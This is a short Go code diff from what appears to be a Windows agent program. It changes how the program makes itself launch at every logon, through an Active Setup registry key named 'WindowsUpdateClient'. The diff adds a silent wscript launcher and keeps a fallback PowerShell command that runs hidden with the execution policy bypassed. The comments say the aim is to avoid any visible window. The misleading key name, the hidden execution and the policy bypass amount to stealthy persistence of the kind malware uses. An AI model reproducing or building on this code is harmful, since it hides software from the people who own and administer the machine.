@@ -27,10 +27,24 @@ func hiddenExec(name string, args ...string) *exec.Cmd {
 	return c
 }
 
+// watchStubWant builds the flash-free Active Setup value (v1.46.96):
+// wscript instead of powershell.exe (which pops a console on every
+// version change). Pure, tested.
+func watchStubWant(exeDir string) string {
+	return `wscript.exe //B //Nologo "` + filepath.Join(exeDir, "watch-stub.vbs") + `"`
+}
+
 // ensureActiveSetupKey repairs the logon-time vector (StubPath is hidden
 // powershell + detached Start-Process: no flash, never blocks logon).
 func ensureActiveSetupKey(agentPath string) {
-	want := `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
+	exeDir := filepath.Dir(agentPath)
+	wantPS := `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
+	// Prefer the wscript stub; fall back to powershell when the stub is
+	// absent (never point logon at a missing file).
+	want := wantPS
+	if _, err := os.Stat(filepath.Join(exeDir, "watch-stub.vbs")); err == nil {
+		want = watchStubWant(exeDir)
+	}
 	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
 	if err != nil {
 		return
